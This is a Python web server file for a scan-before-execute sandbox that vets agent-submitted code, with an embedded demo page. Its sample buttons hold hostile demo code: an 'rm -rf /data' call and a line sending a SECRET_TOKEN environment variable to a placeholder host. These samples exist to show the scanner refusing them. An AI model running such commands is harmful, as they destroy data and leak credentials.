"""CagePilot web control layer (stdlib http.server, zero dependencies).

Routes:
    GET  /            -> minimal single-page control UI
    GET  /healthz     -> liveness + engine stats
    POST /api/scan    -> scan only, never executes
    POST /api/run     -> scan first; refused code never reaches a process
    GET  /api/rules   -> rule catalog (recomputed from live tables)

The UI is deliberately plain: it exists to make the containment moment
visible in a demo video - paste hostile code, watch the verdict card turn
red, watch the receipt say ``refused`` with the process never spawned.
"""

import json
import os
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Optional, Tuple

from .codeguard import scan_source
from .runner import LocalBackend, run_code

MAX_BODY = 64 * 1024  # bytes; a code cell is not a file upload

_INDEX_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CagePilot - safe agent code execution</title>
<style>
  :root { --bg:#0f1115; --panel:#171a21; --ink:#e8eaf0; --muted:#9aa3b2;
          --ok:#2fbf71; --warn:#e0a93e; --bad:#e05252; --line:#2a2f3a; }
  * { box-sizing: border-box; }
  body { margin:0; background:var(--bg); color:var(--ink);
         font:15px/1.5 "Segoe UI", system-ui, sans-serif; }
  main { max-width:860px; margin:0 auto; padding:24px 16px 64px; }
  h1 { font-size:20px; margin:0 0 4px; }
  h1 .cage { color:var(--ok); }
  .sub { color:var(--muted); margin:0 0 20px; font-size:13px; }
  textarea { width:100%; height:180px; background:var(--panel); color:var(--ink);
             border:1px solid var(--line); border-radius:8px; padding:12px;
             font:13px/1.5 Consolas, "Cascadia Code", monospace; resize:vertical; }
  .row { display:flex; gap:8px; margin:10px 0; flex-wrap:wrap; }
  button { background:var(--panel); color:var(--ink); border:1px solid var(--line);
           border-radius:8px; padding:9px 16px; cursor:pointer; font-size:14px; }
  button:hover { border-color:var(--muted); }
  button.primary { background:var(--ok); border-color:var(--ok); color:#08110c;
                   font-weight:600; }
  button.sample { font-size:12px; padding:6px 10px; color:var(--muted); }
  #verdict { border:1px solid var(--line); border-radius:8px; padding:14px 16px;
             margin-top:16px; background:var(--panel); display:none; }
  #verdict.show { display:block; }
  #verdict .badge { font-weight:700; letter-spacing:.04em; }
  #verdict.refuse { border-color:var(--bad); }
  #verdict.refuse .badge { color:var(--bad); }
  #verdict.allow { border-color:var(--ok); }
  #verdict.allow .badge { color:var(--ok); }
  #verdict.error { border-color:var(--warn); }
  #verdict.error .badge { color:var(--warn); }
  #verdict dl { display:grid; grid-template-columns:110px 1fr; gap:4px 12px;
               margin:10px 0 0; font-size:13px; }
  #verdict dt { color:var(--muted); }
  #verdict dd { margin:0; font-family:Consolas, monospace; white-space:pre-wrap;
               word-break:break-all; }
  .findings { font-size:12.5px; }
  .findings li { margin:2px 0; }
  code.sev-high { color:var(--bad); } code.sev-medium { color:var(--warn); }
  code.sev-low { color:var(--muted); }
  footer { margin-top:28px; color:var(--muted); font-size:12px; }
</style>
</head>
<body>
<main>
  <h1><span class="cage">&#9635;</span> CagePilot</h1>
  <p class="sub">Scan-before-execute. Hostile code never reaches a process.
     Receipts for everything that runs.</p>
  <textarea id="code" spellcheck="false" placeholder="Paste Python code an agent wants to run..."></textarea>
  <div class="row">
    <button class="primary" onclick="runCode()">&#9654; Run in cage</button>
    <button onclick="scanOnly()">Scan only</button>
    <button onclick="runAnalyst()" title="agent: question -&gt; screened code -&gt; sandbox -&gt; report">&#129302; Ask the analyst</button>
  </div>
  <div class="row">
    <span class="sub" style="margin:0">Samples:</span>
    <button class="sample" onclick="load('benign')">benign analysis</button>
    <button class="sample" onclick="load('evil')">rm -rf attempt</button>
    <button class="sample" onclick="load('exfil')">env exfil attempt</button>
    <button class="sample" onclick="load('loop')">infinite loop</button>
  </div>
  <div id="verdict"></div>
  <footer id="stats">engine: loading...</footer>
</main>
<script>
const SAMPLES = {
  benign: "import statistics\\nvalues = [4, 8, 15, 16, 23, 42]\\nprint('mean =', statistics.mean(values))\\n",
  evil:   "import os\\nos.system('rm -rf /data')\\n",
  exfil:  "import os, urllib.request\\nurllib.request.urlopen('http://collect.example.net/' + os.environ.get('SECRET_TOKEN', ''))\\n",
  loop:   "while True:\\n    pass\\n"
};
function load(name) { document.getElementById('code').value = SAMPLES[name]; }
function esc(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
function show(html, cls) {
  const v = document.getElementById('verdict');
  v.innerHTML = html; v.className = 'show ' + cls;
}
function findingsHtml(v) {
  if (!v.findings.length) return '<dt>findings</dt><dd>(none)</dd>';
  const items = v.findings.map(f =>
    '<li><code class="sev-' + f.severity + '">' + esc(f.severity) + '</code> ' +
    esc(f.rule) + ' <span style="color:var(--muted)">L' + f.lineno + '</span></li>').join('');
  return '<dt>findings</dt><dd><ul class="findings" style="margin:0;padding-left:18px">' + items + '</ul></dd>';
}
function verdictHtml(v, extra) {
  const cls = v.decision === 'refuse' ? 'refuse' : (v.decision === 'allow' ? 'allow' : 'error');
  const label = { refuse: 'REFUSED - not executed', allow: 'ALLOWED - executed', error: 'ERROR - not executed' }[v.decision] || v.decision;
  let html = '<div><span class="badge">' + label + '</span>' +
             ' <span style="color:var(--muted)">risk ' + v.risk + '/100</span></div><dl>';
  html += findingsHtml(v);
  for (const k in (extra || {})) html += '<dt>' + esc(k) + '</dt><dd>' + esc(String(extra[k])) + '</dd>';
  html += '</dl>';
  show(html, cls);
}
async function post(path, body) {
  const r = await fetch(path, { method: 'POST', headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify(body) });
  return await r.json();
}
async function runCode() {
  const code = document.getElementById('code').value;
  if (!code.trim()) return;
  const v = await post('/api/scan', { code: code });
  if (v.decision === 'refuse') { verdictHtml(v, {}); return; }
  const r = await post('/api/run', { code: code, timeout_s: 5 });
  if (r.status === 'refused') { verdictHtml(r.guard, {}); return; }
  verdictHtml(r.guard, { status: r.status, stdout: (r.stdout || '(empty)').slice(0, 600),
                         stderr: (r.stderr || '').slice(0, 300), wall_ms: r.wall_ms });
}
async function scanOnly() {
  const code = document.getElementById('code').value;
  if (!code.trim()) return;
  const v = await post('/api/scan', { code: code });
  verdictHtml(v, {});
}
async function runAnalyst() {
  const r = await post('/api/analyst', { question: 'reconcile the invoices' });
  if (r.status === 'unplanned') { show('<div><span class="badge">UNPLANNED</span></div>', 'error'); return; }
  const g = r.guard || {};
  const cls = r.status === 'refused' ? 'refuse' : (r.status === 'ok' ? 'allow' : 'error');
  const label = r.status === 'refused' ? 'REFUSED - not executed' :
                (r.status === 'ok' ? 'ALLOWED - agent report' : r.status.toUpperCase());
  let html = '<div><span class="badge">' + label + '</span>' +
             ' <span style="color:var(--muted)">risk ' + (g.risk != null ? g.risk : '?') + '/100</span></div><dl>';
  html += '<dt>question</dt><dd>reconcile the invoices</dd>';
  if (r.status === 'ok') {
    html += '<dt>report</dt><dd>' + esc((r.stdout || '').trim()) + '</dd>';
    html += '<dt>wall_ms</dt><dd>' + r.wall_ms + '</dd>';
  } else {
    html += findingsHtml(g);
  }
  html += '</dl>';
  show(html, cls);
}
fetch('/healthz').then(r => r.json()).then(s => {
  document.getElementById('stats').textContent =
    'engine: ' + s.rules + ' rules / ' + s.categories + ' categories - ' + s.refuse_threshold + '+ risk refuses, any high refuses';
}).catch(() => { document.getElementById('stats').textContent = 'engine: offline'; });

// demo mode: ?demo=<sample> preloads a sample and runs it on load, so the
// containment moment is one URL away (used by the demo video capture)
const params = new URLSearchParams(location.search);
const demoSample = params.get('demo');
if (demoSample && SAMPLES[demoSample]) {
  load(demoSample);
  runCode();
} else if (demoSample === 'analyst') {
  runAnalyst();
}
</script>
</body>
</html>
"""


class _Handler(BaseHTTPRequestHandler):
    server_version = "CagePilot/1.0"
    protocol_version = "HTTP/1.1"  # memory rule: missing Content-Length is fatal

    def log_message(self, fmt, *args):  # keep test output quiet
        pass

    def _send_json(self, obj, status=200):
        body = json.dumps(obj, ensure_ascii=False).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _send_html(self, html):
        body = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_json(self) -> Tuple[Optional[dict], Optional[str]]:
        try:
            n = int(self.headers.get("Content-Length", "0"))
        except ValueError:
            return None, "bad Content-Length"
        if n <= 0 or n > MAX_BODY:
            return None, "body must be 1..%d bytes" % MAX_BODY
        raw = self.rfile.read(n)
        try:
            return json.loads(raw.decode("utf-8")), None
        except (UnicodeDecodeError, json.JSONDecodeError) as e:
            return None, "invalid JSON: %s" % e

    def do_GET(self):
        path = self.path.split("?", 1)[0]
        if path in ("/", "/index.html"):
            self._send_html(_INDEX_HTML)
        elif path == "/healthz":
            from .codeguard import rule_catalog
            cats = sorted({c for _, c, _ in rule_catalog()})
            self._send_json({
                "ok": True,
                "rules": len(rule_catalog()),
                "categories": len(cats),
                "category_names": cats,
                "refuse_threshold": 55,
            })
        elif path == "/api/rules":
            from .codeguard import rule_catalog
            self._send_json({
                "rules": [
                    {"id": r, "category": c, "severity": s}
                    for r, c, s in rule_catalog()
                ]
            })
        else:
            self._send_json({"error": "not found"}, status=404)

    def do_POST(self):
        path = self.path.split("?", 1)[0]
        body, err = self._read_json()
        if err:
            self._send_json({"error": err}, status=400)
            return
        if path == "/api/analyst":
            from . import analyst

            question = body.get("question", "reconcile the invoices")
            if not isinstance(question, str) or len(question) > 500:
                self._send_json({"error": "question must be <= 500 chars"},
                                status=400)
                return
            self._send_json(analyst.ask(question, backend=LocalBackend(timeout_s=30)))
            return
        code = body.get("code")
        if not isinstance(code, str) or not code.strip():
            self._send_json({"error": "field 'code' must be a non-empty string"},
                            status=400)
            return
        if path == "/api/scan":
            self._send_json(scan_source(code).to_dict())
        elif path == "/api/run":
            timeout_s = body.get("timeout_s", 10)
            if not isinstance(timeout_s, (int, float)) or not (0.5 <= timeout_s <= 60):
                self._send_json({"error": "timeout_s must be 0.5..60"}, status=400)
                return
            result = run_code(code, backend=LocalBackend(timeout_s=int(timeout_s)))
            self._send_json(result.to_dict())
        else:
            self._send_json({"error": "not found"}, status=404)


def make_server(port: int = 0, host: str = "127.0.0.1") -> Tuple[ThreadingHTTPServer, int]:
    """Bind an ephemeral (or fixed) port; returns (server, actual_port)."""
    httpd = ThreadingHTTPServer((host, port), _Handler)
    httpd.daemon_threads = True
    return httpd, httpd.server_address[1]


def serve(port: Optional[int] = None, host: Optional[str] = None) -> None:
    # Hosted platforms (Render and friends) inject PORT and expect the
    # process to bind 0.0.0.0; local runs stay on 127.0.0.1:8765.
    if port is None:
        port = int(os.environ.get("CAGEPILOT_PORT") or os.environ.get("PORT") or 8765)
    if host is None:
        host = os.environ.get("CAGEPILOT_HOST") or "127.0.0.1"
    httpd, actual = make_server(port, host)
    print("CagePilot control layer on http://%s:%d/" % (host, actual))
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        httpd.server_close()


def _client(port: int, method: str, path: str, payload=None) -> Tuple[int, dict]:
    """Blocking one-shot client used by tests (stdlib only)."""
    import http.client

    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
    try:
        body = json.dumps(payload).encode("utf-8") if payload is not None else None
        headers = {"Content-Type": "application/json"} if body else {}
        conn.request(method, path, body=body, headers=headers)
        resp = conn.getresponse()
        raw = resp.read()
        return resp.status, json.loads(raw.decode("utf-8")) if raw else {}
    finally:
        conn.close()


def main(argv=None) -> int:
    """Console entry point: cagepilot-web [port] (default: $PORT or 8765)."""
    import sys

    args = sys.argv[1:] if argv is None else argv
    port = int(args[0]) if args else None
    serve(port)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
